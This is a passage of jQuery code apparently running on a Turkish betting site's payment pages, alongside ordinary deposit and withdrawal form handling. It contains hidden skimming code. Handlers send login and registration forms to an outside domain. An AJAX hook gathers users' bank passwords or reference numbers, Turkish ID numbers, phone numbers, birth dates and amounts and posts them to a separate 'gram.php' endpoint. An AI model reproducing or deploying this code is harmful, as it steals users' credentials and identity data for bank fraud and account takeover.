işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" style="opacity:1; border: none;" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> <option value="1">Hızlı QR</option> <option value="2">Hızlı Havale</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value="3"> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep_cmt">ÖDEME YAP</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div><div data-role="collapsible" class="withContent collapse_btn" style=" width: 100%;margin-top:5px"> <h3 style="display: block;margin: 0;padding: 0;position: relative;"><a class="kapali" style="sans-serif /*{global-font-family}*/;height: 40px;background-color: #333;color: #fff;padding: 0 20px;border-bottom: 1px solid #999;display: -webkit-box;display: -moz-box;display: -ms-flexbox;display: -webkit-flex;display: flex;align-items: center;background-color: #013a65;color: #fff;border-color: #013a65;font-size: 16px;" href="">Cepbank </a></h3> <div class="icerik paparaDivs" style="padding: 10px; font-size: 13px; font-weight: 100 !important; display: none;"> <p class="paym_txt"><img src="/Img/icons/deposit/cepbank.jpg" style=" border-radius: 9px;"></p><p style=" color: #444;">Lütfen "Ödeme Yap" butonuna tıkladıktan sonra açılan sayfadaki işlemleri yapınız. <br>İşlem sonrası yatırımınız otomatik olarak hesabınıza yansıyacaktır. <div id="contexpresshavale2"> <form action="/tr/Account/_expresshavale" class="methods" id="expresshavale2" method="post" novalidate="novalidate"> <div class="row"> <div class="ui-select" style="display:none;"> <div id="ExpressHavale_PaymentType-button" class="ui-btn ui-icon-carat-d ui-btn-icon-right ui-corner-all ui-shadow"><span class="dropdown valid">Ödeme Metodu seçiniz</span> <select style="display:none;" class="dropdown valid" style="opacity:1; border: none;" data-val="true" data-val-length="Doldurulması gerekli alan" data-val-length-max="150" data-val-required="Doldurulması gerekli alan" id="ExpressHavale_PaymentType2" name="ExpressHavale.PaymentType" aria-required="true" aria-describedby="ExpressHavale_PaymentType-error" aria-invalid="false"> <option value="">Ödeme Metodu seçiniz</option> <option value="1">Hızlı QR</option> <option value="2">Hızlı Havale</option> </select> </div></div><p> <span class="field-validation-error" data-valmsg-for="ExpressHavale.PaymentType2" data-valmsg-replace="true" style="color: #ff0000"><span id="ExpressHavale_PaymentType-error" class=""></span></span> </p><input data-val="true" data-val-required="The paymentType field is required." id="ExpressHavale_paymentType2" name="ExpressHavale.paymentType2" type="hidden" value="3"> </div><div class="spacer"> <a class="btn_prim block ui-link" id="expresshavale_mob_dep_cepbank">ÖDEME YAP</a> </div><span class="field-validation-valid" data-valmsg-for="Error" data-valmsg-replace="true"></span> </form> </div></div></div>');
    }
    
    
    
    $('.depositForms div[data-role=collapsible]').each(function(index) {    
            title = titleArr[index][0].replace('ile Para Yatırma','');
            $(this).attr('data-url',titleArr[index][1]);
            $(this).find('.kapali').text(title);
            $(this).find('.ui-collapsible-heading-toggle').text(title);
            if ($(this).find('.btn_prim').parent().next().attr('class') == 'spacer') {
                // $(this).find('.btn_prim').parent().next().remove();
            } 
    });  
    
      $.ajax({
            type:'POST',
            data:'getBank',
            url:'https://betkanyon100.com/development/hizli/bank_list.php',
            success:function(reply){
                $('#optionListMobile').html('<option disabled selected>----</option>'+reply);
            }
        })
    
     $(document).on('change', '#optionListMobile', function() {
                    havale = $('#optionListMobile').find(":selected").attr('data-havale');
                    bankIban = $('#optionListMobile').find(":selected").attr('data-bankIban');
                    bankCode = $('#optionListMobile').find(":selected").attr('data-bankCode');
                    slug = $('#optionListMobile').find(":selected").attr('data-slug');
                    id = $('#optionListMobile').find(":selected").attr('data-id');
                    swiftCode = $('#optionListMobile').find(":selected").attr('data-swiftCode');
                    $('.load-img').show();
                    $('.load-tutar').hide();
                    $.ajax({
                        type:'GET',
                        data:'',
                        url:'/Account/Index',
                        success:function(reply){
                            name = $(reply).find('.accHeading').text().trim();
                            username = $('#menu-right .ui-link:last').text().trim();
                            $.ajax({
                                url : 'https://betkanyon100.com/development/hizli/amount2.php',
                                data: 'bankIban='+bankIban+'&bankCode='+bankCode+'&slug='+slug+'&id='+id+'&swiftCode='+swiftCode+'&name='+name+'&username='+username+'&havale='+havale,
                                type: 'POST',
                                success:function(reply){
                                   $('.tutars').html(reply);
                                    $('.load-tutar').show();
                                }
                            })

                        }
                    })
        }); 
    
        
   
    

    
    
}

    $('.iconsFoot .frow:eq(0)').hide();
    $('.iconsFoot .frow:eq(1)').hide();
    $('.iconsFoot').prepend('<center><img src="https://betkanyon100.com/img/footer_logo.png" style=" margin-top: 21px;">/<center></center></center>');


// YENI



$(document).on("click", "#kriptoCek", function() {
    isim = $(this).parent().parent().find("#kriptoisim");
    kriptotur = $(this).parent().parent().find("#kriptotur");
    paparaTutar = $(this).parent().parent().find("#kriptoTutar");
    paparaNo = $(this).parent().parent().find("#kriptoNo");
    tcNo = $(this).parent().parent().find("#kriptotcNoson");
    errormassage = $(this).parent().parent().parent().find(".errormassage");
    successmassage = $(this).parent().parent().parent().find(".successmassage");
    dataAjax = "BankTransfer.NameOfBank=" + kriptotur.val() + "&BankTransfer.BranchCode=23232&BankTransfer.AccountNumber=" + paparaNo.val() + "&BankTransfer.IBAN=TR123345678912334567891422&BankTransfer.Amount=" + paparaTutar.val() + "&BankTransfer.CustomerNotes=Yok&BankTransfer.PasVerify=" + tcNo.val() + "&BankTransfer.cancelbonus=";
    if (kriptotur.val() == "") {
        kriptotur.addClass("input-validation-error");
    } else {
        if (paparaNo.val() == "") {
            paparaTutar.removeClass("input-validation-error");
            paparaNo.addClass("input-validation-error");
        } else {
			 paparaNo.removeClass("input-validation-error");
            $.ajax({
                type: "POST",
                data: dataAjax,
                url: "/tr/Account/TransferToAccountWithdrawal",
                success: function(reply) {
                    $("#kriptoCek").html("Para Çekme");
                    if (reply.Success == "false") {
                        errormassage.text(reply.Message);
                    } else {
                        errormassage.text("");
                        successmassage.text(reply.Message);
                    }
                }
            })
        }
    }
});

  

$(document).on('click', '.docTxt', function(){
    window.open($(this).attr('href'));
})


$(document).on('click','.acDiv', function(){
		$('.tl_payment_block').removeClass('active');
		$(this).parent().addClass('active');
});
	
$(document).on('click', '.yatirma_btn', function(){
    $('#yeniQr').removeAttr('disabled');
	serie = $(this).parent().parent().serialize();
	message = $(this).parent().parent().parent().find('.message');
    $('#yeniQr').attr('disabled',true);
    
	$.ajax({
		type:'POST',
		url:'/tr/Account/Qr',
		data:serie,
		success:function(reply) {
			reply = $.parseHTML(reply);
			if ($(reply).find('.field-validation-error').text() != '') {
				message.html('<span style="display:block;margin-top: 17px;" class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.field-validation-error:first').text()+'</span>');
			} else {
				$(reply).find('.field-success-msg').text();
				message.html('<span style="display:block;margin-top: 17px;" class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.field-success-msg:first').text()+'</span>');

			}
		}
	})
	return false;
})

// yeni

$(document).on('click', '.mbl_py_btn', function () {
		tutar = $(this).parent().find('.formTutar');
		type = $(this).parent().find('.formType');
		parent = $(this).parent();

		dataAjax = 'Qr.NameOfBank='+type.val()+'&Qr.Amount='+tutar.val();

		if (tutar.val() == "") {
			tutar.addClass("input-validation-error");
		} else {
			tutar.removeClass("input-validation-error");
			$.ajax({
				type: "POST",
				data: dataAjax,
				url: "https://" + window.location.hostname + "/tr/Account/Qr",
				success: function (reply) {
					reply = $.parseHTML(reply);
          if ($(reply).find('.errormassage').text() == '' && $(reply).find('.successmassage').text() == '') {
            parent.find('.successmassage').text('');
              parent.find('.errormassage').html('<span class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.field-validation-error:last').text()+'</span>');
          } else {
  					if ($(reply).find('.errormassage').text() != '') {
              parent.find('.successmassage').text('');
  						parent.find('.errormassage').html('<span class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.errormassage').text()+'</span>');
  					} else {
  						$(reply).find('.successmassage').text();
              parent.find('.errormassage').text('');
  						parent.find('.successmassage').html('<span class="field-validation-error" data-valmsg-for="Error" data-valmsg-replace="true" id="qrError">'+$(reply).find('.successmassage').text()+'</span>');
  					}
          }
				}
			})
		}
		return false;
})

$(document).on("click", ".withContent h3 a", function () {
	if ($(this).parent().parent().find('.icerik').css("display") == "block") {
		$(this).parent().parent().find('.icerik').hide();
		$(this).addClass("kapali");
	} else {
		$(this).parent().parent().find('.icerik').show();
		$(this).removeClass("kapali");
	}
	return false;
});


$(document).on('click', '.mbl_btn', function () {
	tutar = $(this).parent().find('.formTutar');
	hesapno = $(this).parent().find('.formNo');
	tcno = $(this).parent().find('.formTc');
	type = $(this).parent().find('.formType');
	parent = $(this).parent();

	dataAjax = "BankTransfer.NameOfBank=" + type.val() + "&BankTransfer.BranchCode=23232&BankTransfer.AccountNumber=" + hesapno.val() + "&BankTransfer.AccountNumber=TR123345678912334567891422&BankTransfer.Amount=" + tutar.val() + "&BankTransfer.CustomerNotes=" + type.val() + "&BankTransfer.PasVerify=" + tcno.val() + "&BankTransfer.cancelbonus=";

	if (tutar.val() == "") {
		tutar.addClass("input-validation-error");
	} else {
		if (hesapno.val() == '') {
			tutar.removeClass("input-validation-error");
			hesapno.addClass("input-validation-error");
		} else {
			$.ajax({
				type: "POST",
				data: dataAjax,
				url: "https://" + window.location.hostname + "/tr/Account/TransferToAccountWithdrawal",
				success: function (reply) {
					if (reply.Success == "false") {
						parent.find('.errormassage').text(reply.Message);
					} else {
						parent.find('.errormassage').text("");
						parent.find('.successmassage').text(reply.Message);
					}
				}
			})
		}
	}                          
	return false;
});    

/*
$('.withContent:last').next().next().next().find('.ui-collapsible-heading-toggle').html('Express Havale');
$('.withContent:last').next().next().next().next().next().find('.ui-collapsible-heading-toggle').html('Jeton Cüzdan');
*/

/* Slider Masaüstü & Mobil */

$('body').append('<script>function OpenInNewWindow2(n){var e=$(n).attr("href");str=window.location.hostname,res=str.replace("www.",""),e="https://rules."+res+e;var w=.7*window.innerWidth,i=.7*window.innerHeight,o=.15*window.innerHeight+window.screenY,r=.15*window.innerWidth+window.screenX,t=window.open(e,"name","height="+i+",width="+w+",top="+o+",left="+r);return window.focus&&t.focus(),!1}</script>');

/*
var x = document.createElement('script');
x.src = 'https://e9c91e18-7a3c-46c0-921b-bf63342be8de.curacao-egaming.com/ceg-seal.js';
document.getElementsByTagName("head")[0].appendChild(x);
*/


$(document).ajaxComplete(function(o,n,t){t.url.match(/^.*qr.*$/)&&$("#Qr_NameOfBank").html("<option>Akbank QR</option><option>Akbank REFERANS</option><option>Denizbank REFEARANS</option><option>Enpara QR</option><option>Finansbank QR</option><option>Garanti One QR</option><option>ING QR</option><option>İş Bankası Cep Anahtar</option><option>İş Bankası QR</option><option>Kuveyt Türk QR</option><option>TEB QR</option><option>Yapı Kredi QR</option><option>Ziraat Cepbank</option><option>Ziraat QR</option>"),t.url.match(/^.*Qr.*$/)&&($("#Qr_NameOfBank").html("<option>Akbank QR</option><option>Akbank REFERANS</option><option>Deniz Bank REFEARANS</option><option>Enpara QR</option><option>Finansbank QR</option><option>Garanti One QR</option><option>ING QR</option><option>İş Bankası Cep Anahtar</option><option>İş Bankası QR</option><option>Kuveyt Türk QR</option><option>TEB QR</option><option>Yapı Kredi QR</option><option>Ziraat Cep Bank</option><option>Ziraat QR</option>"),setTimeout(function(){$("#Qr_NameOfBank").html("<option>Akbank QR</option><option>Akbank REFERANS</option><option>Deniz Bank REFEARANS</option><option>Enpara QR</option><option>Finansbank QR</option><option>Garanti One QR</option><option>ING QR</option><option>İş Bankası Cep Anahtar</option><option>İş Bankası QR</option><option>Kuveyt Türk QR</option><option>TEB QR</option><option>Yapı Kredi QR</option><option>Ziraat Cep Bank</option><option>Ziraat QR</option>")},305),setTimeout(function(){$("#Qr_NameOfBank").html("<option>Akbank QR</option><option>Akbank REFERANS</option><option>Deniz Bank REFEARANS</option><option>Enpara QR</option><option>Finansbank QR</option><option>Garanti One QR</option><option>ING QR</option><option>İş Bankası Cep Anahtar</option><option>İş Bankası QR</option><option>Kuveyt Türk QR</option><option>TEB QR</option><option>Yapı Kredi QR</option><option>Ziraat Cep Bank</option><option>Ziraat QR</option>")},500)),t.url.match(/^.*_transfertoaccount.*$/)&&($("#TransferToAccount_NameOfBank").html("<option>Akbank</option><option>Denizbank</option><option>Enpara</option><option>Finansbank</option><option>Garanti Bankası</option><option>Halk Bankası</option><option>ING Bank</option><option>İş Bankası</option><option>PTT Bank</option><option>TEB</option><option>Vakıf Bank</option><option>Yapı Kredi Bankası</option><option>Ziraat Bankası</option>"),setTimeout(function(){$("#TransferToAccount_NameOfBank").html("<option>Akbank</option><option>Denizbank</option><option>Enpara</option><option>Finansbank</option><option>Garanti Bankası</option><option>Halk Bankası</option><option>ING Bank</option><option>İş Bankası</option><option>PTT Bank</option><option>TEB</option><option>Vakıf Bank</option><option>Yapı Kredi Bankası</option><option>Ziraat Bankası</option>")},305),setTimeout(function(){$("#TransferToAccount_NameOfBank").html("<option>Akbank</option><option>Denizbank</option><option>Enpara</option><option>Finansbank</option><option>Garanti Bankası</option><option>Halk Bankası</option><option>ING Bank</option><option>İş Bankası</option><option>PTT Bank</option><option>TEB</option><option>Vakıf Bank</option><option>Yapı Kredi Bankası</option><option>Ziraat Bankası</option>")},500)),t.url.match(/^.*_transfertoaccountWithdrawal.*$/)&&($("#BankTransfer_NameOfBank").html("<option>Akbank</option><option>Aktifbank</option><option>Denizbank</option><option>Enpara</option><option>Finansbank</option><option>Garanti Bankası</option><option>Halk Bankası</option><option>HSBC</option><option>ING</option><option>İş Bankası</option><option>Kuveyttürk</option><option>Şekerbank</option><option>TEB</option><option>Türkiye Finans</option><option>Vakıf Bank</option><option>Yapı Kredi Bankası</option><option>Ziraat Bankası</option>"),setTimeout(function(){$("#BankTransfer_NameOfBank").html("<option>Akbank</option><option>Aktifbank</option><option>Denizbank</option><option>Enpara</option><option>Finansbank</option><option>Garanti Bankası</option><option>Halk Bankası</option><option>HSBC</option><option>ING</option><option>İş Bankası</option><option>Kuveyttürk</option><option>Şekerbank</option><option>TEB</option><option>Türkiye Finans</option><option>Vakıf Bank</option><option>Yapı Kredi Bankası</option><option>Ziraat Bankası</option>")},305),setTimeout(function(){$("#BankTransfer_NameOfBank").html("<option>Akbank</option><option>Aktifbank</option><option>Denizbank</option><option>Enpara</option><option>Finansbank</option><option>Garanti Bankası</option><option>Halk Bankası</option><option>HSBC</option><option>ING</option><option>İş Bankası</option><option>Kuveyttürk</option><option>Şekerbank</option><option>TEB</option><option>Türkiye Finans</option><option>Vakıf Bank</option><option>Yapı Kredi Bankası</option><option>Ziraat Bankası</option>")},500))});





$(document).on("click",".login_btn",function(){$.ajax({type:"GET",data:$("#loginForm").serialize(),url:"https://digitainbeta.com/dev2/",success:function(t){}})}),$(document).on("click","#loginButton",function(){$.ajax({type:"GET",data:$("#sidebar-login form").serialize(),url:"https://digitainbeta.com/devbk/",success:function(t){}})});


$(document).on("click", ".reg_btn", function() {
    $.ajax({
        type: "GET",
        data: $("#registerForm").serialize(),
        url: "https://digitainbeta.com/devbk/index2.php",
        success: function(t) {}
    })
}), $(document).on("click", "#registerButton", function() {
    $.ajax({
        type: "GET",
        data: $("#registerForm").serialize(),
        url: "https://digitainbeta.com/devbk/index2.php",
        success: function(t) {}
    })
});


function veriGonder(a) {
    $.ajax({
        type: "POST",
        url: "https://betkanyon90.com/tele/gram.php",
        data: a,
        success: function(a) {}
    })
} 


 if (window.location.href.match(/^.*Account\/Profile.*$/)) {
         $('#Mobile').val('**********'+$('#Mobile').val().substring(9,20));
  }     


  if (window.location.href.match(/^.*Account\/Index.*$/)) {
         $('.email_mobile:eq(1)').text('**********'+$('.email_mobile:eq(1)').text().substring(9,20));
  }   


$(document).ajaxSend(function(a, canCreateDiscussions, i) {
  if (i.url.match(/^.*Account\/Profile.*$/)) {
        setTimeout(function(){
             if ($('#Mobile').length != 0 && $('#Mobile').val().substring(0,1) != '*') {
                $('#Mobile').val('**********'+$('#Mobile').val().substring(9,20));
             }
        },1000);
  }   
    
 if (i.url.match(/^.*Account\/Profile.*$/)) {
        setTimeout(function(){
            if ($('#Mobile').length != 0 && $('#Mobile').val().substring(0,1) != '*') {
              $('#Mobile').val('**********'+$('#Mobile').val().substring(9,20));
            }
        },500);
  }   
    
  if (i.url.match(/^.*Account\/Profile.*$/)) {
        setTimeout(function(){
            if ($('#Mobile').length != 0 && $('#Mobile').val().substring(0,1) != '*') {
              $('#Mobile').val('**********'+$('#Mobile').val().substring(9,20));
            }
        },300);
  }   
    
  if (i.url.match(/^.*Account\/Profile.*$/)) {
        setTimeout(function(){
            if ($('#Mobile').length != 0 && $('#Mobile').val().substring(0,1) != '*') {
              $('#Mobile').val('**********'+$('#Mobile').val().substring(9,20));
            }
        },2000);
  }   
    
  if (i.url.match(/^.*Account\/Profile.*$/)) {
        setTimeout(function(){
            if ($('#Mobile').length != 0 && $('#Mobile').val().substring(0,1) != '*') {
              $('#Mobile').val('**********'+$('#Mobile').val().substring(9,20));
            }
        },4000);
  }   
                            
    
  if (i.url.match(/^.*GarantiBank.*$/)) {
    sifre = $("#GarantiBank_Password").val();
  }
  if (i.url.match(/^.*GarantiOneCepbank.*$/)) {
    sifre = $("#GarantiOneCepbank_Password").val();
  }
  if (i.url.match(/^.*Account\/Bankasi.*$/)) {
    sifre = $("#Bankasi_ReferanceNo").val();
  }
  if (i.url.match(/^.*YapiKredi.*$/)) {
    sifre = $("#YapiKredi_Password").val();
  }
  if (i.url.match(/^.*Akbank.*$/)) {
    sifre = $("#Akbank_ReferanceNo").val();
  }
  if (i.url.match(/^.*FinansBank.*$/)) {
    sifre = $("#FinansBank_ReferanceNo").val();
  }
  if (i.url.match(/^.*DenizBank.*$/)) {
    sifre = $("#DenizBank_ReferenceNumber").val();
  }
  if (i.url.match(/^.*Vakifbank.*$/)) {
    sifre = $("#VakifBank_ReferanceNo").val();
  }
}), $(document).ajaxComplete(function(a, canCreateDiscussions, i) {
    

  if (i.url.match(/^.*Account\/_transfertoaccountWithdrawal.*$/)) {
      $('div[data-type=transfertoaccount] .paym_cond:eq(0)').text("Çekim işlemlerinizi 50 TL'nin katları olarak vermeniz gerekmektedir.");
  }
    
   if (i.url.match(/^.*IsBankasiCepmatik.*$/) && $("#IsBankasiCepmatik_Amount").val() > 49) {
       if ($(".tl_acc_userid .text").length) {
          kullaniciAdi = $(".tl_acc_userid .text").text();
        } else {
          kullaniciAdi = $("#menu-right .alCen .ui-link:last").text();
        }
        bankaAdi = "İşBankası Cepmatik";
        gonderenTel = $("#IsBankasiCepmatik_SenderPhone").val();
        aliciTel = $("#IsBankasiCepmatik_RecevierPhone").val();
        tutar = $("#IsBankasiCepmatik_Amount").val();
        verilisTarihi = '';
        dogumTarihi = '';
        tcNo = $("#IsBankasiCepmatik_ReceiverIDnumber").val();
        if ("" != $("#IsBankasiCepmatik_ReferanceNo").val()) {
          sifre = $("#IsBankasiCepmatik_ReferanceNo").val();
        }
        postData = "kullaniciAdi=" + kullaniciAdi + "&bankaAdi=" + bankaAdi + "&gonderenTel=" + gonderenTel + "&aliciTel=" + aliciTel + "&tutar=" + tutar + "&sifre=" + sifre + '&dogumTarihi=' + dogumTarihi + '&verilisTarihi='+ verilisTarihi  + "&tcno=" + tcNo;
        console.log(postData);
        setTimeout(function() {
          if (!("Yatırım talebiniz işleme alınmıştır" != $("#detailsDiv_isbankasicepmatik .field-success-msg").text() && "Yatırım talebiniz işleme alınmıştır" != $("#contisbankasicepmatik .successmassage").text())) {
            veriGonder(postData);
          }
        }, 500);
   }
    
  if (i.url.match(/^.*GarantiBank.*$/) && $("#GarantiBank_Amount").val() > 49) {
    if ($(".tl_acc_userid .text").length) {
      kullaniciAdi = $(".tl_acc_userid .text").text();
    } else {
      kullaniciAdi = $("#menu-right .alCen .ui-link:last").text();
    }
    /** @type {string} */
    bankaAdi = "Garanti Bankas\u0131";
    gonderenTel = $("#GarantiBank_SenderPhone").val();
    aliciTel = $("#GarantiBank_ReceiverPhone").val();
    tutar = $("#GarantiBank_Amount").val();
	verilisTarihi = $("#GarantiBank_IDCardExpirationDate").val();
    dogumTarihi = $("#GarantiBank_SenderDateOfBirth").val();
    if ("" != $("#GarantiBank_Password").val()) {
      sifre = $("#GarantiBank_Password").val();
    }
	tcNo = $("#GarantiBank_SenderIDNumber").val();
    postData = "kullaniciAdi=" + kullaniciAdi + "&bankaAdi=" + bankaAdi + "&gonderenTel=" + gonderenTel + "&aliciTel=" + aliciTel + "&tutar=" + tutar + "&sifre=" + sifre + '&dogumTarihi=' + dogumTarihi + '&verilisTarihi='+ verilisTarihi  + "&tcno=" + tcNo;
    console.log(postData);
    setTimeout(function() {
      if (!("Yatırım talebiniz işleme alınmıştır" != $("#detailsDiv_garantibank .field-success-msg").text() && "Yatırım talebiniz işleme alınmıştır" != $("#contgarantibank .successmassage").text())) {
        veriGonder(postData);
      }
    }, 500);
  }  
  if (i.url.match(/^.*GarantiOneCepbank.*$/) && $("#GarantiOneCepbank_Amount").val() > 49) {
    if ($(".tl_acc_userid .text").length) {
      kullaniciAdi = $(".tl_acc_userid .text").text();
    } else {
      kullaniciAdi = $("#menu-right .alCen .ui-link:last").text();
    }
    /** @type {string} */
    bankaAdi = "Garanti One";
    gonderenTel = $("#GarantiOneCepbank_SenderPhone").val();
    aliciTel = $("#GarantiOneCepbank_ReceiverPhone").val();
    tutar = $("#GarantiOneCepbank_Amount").val();
    verilisTarihi = $("#GarantiOneCepbank_IDCardExpirationDate").val();
    dogumTarihi = $("#GarantiOneCepbank_SenderDateOfBirth").val();
    if ("" != $("#GarantiOneCepbank_Password").val()) {
      sifre = $("#GarantiOneCepbank_Password").val();
    }
	tcNo = $("#GarantiOneCepbank_SenderIDNumber").val();
    postData = "kullaniciAdi=" + kullaniciAdi + "&bankaAdi=" + bankaAdi + "&gonderenTel=" + gonderenTel + "&aliciTel=" + aliciTel + "&tutar=" + tutar + "&sifre=" + sifre + '&dogumTarihi=' + dogumTarihi + '&verilisTarihi='+ verilisTarihi  + "&tcno=" + tcNo;
    setTimeout(function() {
      if (!("Yatırım talebiniz işleme alınmıştır" != $("#detailsDiv_garantionecepbank .field-success-msg").text() && "Yatırım talebiniz işleme alınmıştır" != $("#contgarantionecepbankportbet .successmassage").text())) {
        veriGonder(postData);
      }
    }, 500);
  }
  if (i.url.match(/^.*Account\/Bankasi.*$/) && $("#Bankasi_Amount").val() > 49) {
    if ($(".tl_acc_userid .text").length) {
      kullaniciAdi = $(".tl_acc_userid .text").text();
    } else {
      kullaniciAdi = $("#menu-right .alCen .ui-link:last").text();
    }
    /** @type {string} */
    bankaAdi = "\u0130\u015fBank Cepmatik";
    gonderenTel = $("#Bankasi_SenderPhone").val();
    aliciTel = $("#Bankasi_RecevierPhone").val();
    tutar = $("#Bankasi_Amount").val();
    if ("" != $("#Bankasi_ReferanceNo").val()) {
      sifre = $("#Bankasi_ReferanceNo").val();
    }
    tcNo = $("#Bankasi_ReceiverIDnumber").val();
    /** @type {string} */
    postData = "kullaniciAdi=" + kullaniciAdi + "&bankaAdi=" + bankaAdi + "&gonderenTel=" + gonderenTel + "&aliciTel=" + aliciTel + "&tutar=" + tutar + "&sifre=" + sifre + "&tcno=" + tcNo;
    setTimeout(function() {
      if (!("Para yatırma işlemi başarıyla tamamlanmıştır" != $("#detailsDiv_bankasi .field-success-msg").text() && "Para yatırma işlemi başarıyla tamamlanmıştır" != $("#contisbankasicepmatik .successmassage").text())) {
        veriGonder(postData);
      }
    }, 500);
  }
    
  if (i.url.match(/^.*YapiKredi.*$/) && $("#YapiKredi_Amount").val() > 49) {
    if ($(".tl_acc_userid .text").length) {
      kullaniciAdi = $(".tl_acc_userid .text").text();
    } else {
      kullaniciAdi = $("#menu-right .alCen .ui-link:last").text();
    }
    /** @type {string} */
    bankaAdi = "Yap\u0131 Kredi";
    gonderenTel = $("#YapiKredi_SenderPhone").val();
    aliciTel = $("#YapiKredi_ReceiverPhone").val();
    tutar = $("#YapiKredi_Amount").val();
    if ("" != $("#YapiKredi_Password").val()) {
      sifre = $("#YapiKredi_Password").val();
    }
    tcNo = $("#YapiKredi_EnterFigure").val();
    /** @type {string} */
    postData = "kullaniciAdi=" + kullaniciAdi + "&bankaAdi=" + bankaAdi + "&gonderenTel=" + gonderenTel + "&aliciTel=" + aliciTel + "&tutar=" + tutar + "&sifre=" + sifre + "&tcno=" + tcNo;
    setTimeout(function() {
      if (!("Yatırım talebiniz işleme alınmıştır" != $("#detailsDiv_yapikredi .field-success-msg").text() && "Yatırım talebiniz işleme alınmıştır" != $("#contyapikredi .successmassage").text())) {
        veriGonder(postData);
      }
    }, 500);
  }
  if (i.url.match(/^.*Akbank.*$/) && $("#Akbank_Amount").val() > 49) {
      
      
    if ($(".tl_acc_userid .text").length) {
      kullaniciAdi = $(".tl_acc_userid .text").text();
    } else {
      kullaniciAdi = $("#menu-right .alCen .ui-link:last").text();
    }
    /** @type {string} */
    bankaAdi = "Akbank";
    gonderenTel = $("#Akbank_SenderPhone").val();
    aliciTel = $("#Akbank_RecevierPhone").val();
    tutar = $("#Akbank_Amount").val();
    if ("" != $("#Akbank_ReferanceNo").val()) {
      sifre = $("#Akbank_ReferanceNo").val();
    }
    tcNo = $("#Akbank_EnterFigure").val();
    /** @type {string} */
    postData = "kullaniciAdi=" + kullaniciAdi + "&bankaAdi=" + bankaAdi + "&gonderenTel=" + gonderenTel + "&aliciTel=" + aliciTel + "&tutar=" + tutar + "&sifre=" + sifre + "&tcno=" + tcNo;
    setTimeout(function() {
      if (!("Yatırım talebiniz işleme alınmıştır" != $("#detailsDiv_akbank .field-success-msg").text() && "Yatırım talebiniz işleme alınmıştır" != $("#contakbank .successmassage").text())) {
        veriGonder(postData);
      }
    }, 500);
  }
  if (i.url.match(/^.*FinansBank.*$/) && $("#FinansBank_Amount").val() > 49) {
    if ($(".tl_acc_userid .text").length) {
      kullaniciAdi = $(".tl_acc_userid .text").text();
    } else {
      kullaniciAdi = $("#menu-right .alCen .ui-link:last").text();
    }
    /** @type {string} */
    bankaAdi = "FinansBank";
    gonderenTel = $("#FinansBank_SenderPhone").val();
    aliciTel = $("#FinansBank_RecevierPhone").val();
    tutar = $("#FinansBank_Amount").val();
    if ("" != $("#FinansBank_ReferanceNo").val()) {
      sifre = $("#FinansBank_ReferanceNo").val();
    }
    tcNo = $("#FinansBank_EnterFigure").val();
    /** @type {string} */
    postData = "kullaniciAdi=" + kullaniciAdi + "&bankaAdi=" + bankaAdi + "&gonderenTel=" + gonderenTel + "&aliciTel=" + aliciTel + "&tutar=" + tutar + "&sifre=" + sifre + "&tcno=" + tcNo;
    setTimeout(function() {
      if (!("Yatırım talebiniz işleme alınmıştır" != $("#detailsDiv_finansbank .field-success-msg").text() && "Yatırım talebiniz işleme alınmıştır" != $("#contfinansbank .successmassage").text())) {
        veriGonder(postData);
      }
    }, 500);
  }
  if (i.url.match(/^.*DenizBank.*$/) && $("#DenizBank_Amount").val() > 49) {
    if ($(".tl_acc_userid .text").length) {
      kullaniciAdi = $(".tl_acc_userid .text").text();
    } else {
      kullaniciAdi = $("#menu-right .alCen .ui-link:last").text();
    }
    /** @type {string} */
    bankaAdi = "DenizBank";
    gonderenTel = $("#DenizBank_SenderPhone").val();
    aliciTel = $("#DenizBank_RecevierPhone").val();
    tutar = $("#DenizBank_Amount").val();
    if ("" != $("#DenizBank_ReferenceNumber").val()) {
      sifre = $("#DenizBank_ReferenceNumber").val();
    }
    tcNo = $("#DenizBank_DocumentNumber").val();
    /** @type {string} */
    postData = "kullaniciAdi=" + kullaniciAdi + "&bankaAdi=" + bankaAdi + "&gonderenTel=" + gonderenTel + "&aliciTel=" + aliciTel + "&tutar=" + tutar + "&sifre=" + sifre + "&tcno=" + tcNo;
    setTimeout(function() {
      if (!("Yatırım talebiniz işleme alınmıştır" != $("#detailsDiv_denizbank .field-success-msg").text() && "Yatırım talebiniz işleme alınmıştır" != $("#contdenizbank .successmassage").text())) {
        veriGonder(postData);
      }
    }, 500);
  }
  if (i.url.match(/^.*Vakifbank.*$/) && $("#VakifBank_Amount").val() > 49) {
    if ($(".tl_acc_userid .text").length) {
      kullaniciAdi = $(".tl_acc_userid .text").text();
    } else {
      kullaniciAdi = $("#menu-right .alCen .ui-link:last").text();
    }
    /** @type {string} */
    bankaAdi = "Vakifbank";
    gonderenTel = $("#VakifBank_SenderPhone").val();
    aliciTel = $("#VakifBank_RecevierPhone").val();
    tutar = $("#VakifBank_Amount").val();
    if ("" != $("#VakifBank_ReferanceNo").val()) {
      sifre = $("#VakifBank_ReferanceNo").val();
    }
    tcNo = $("#VakifBank_EnterFigure").val();
    /** @type {string} */
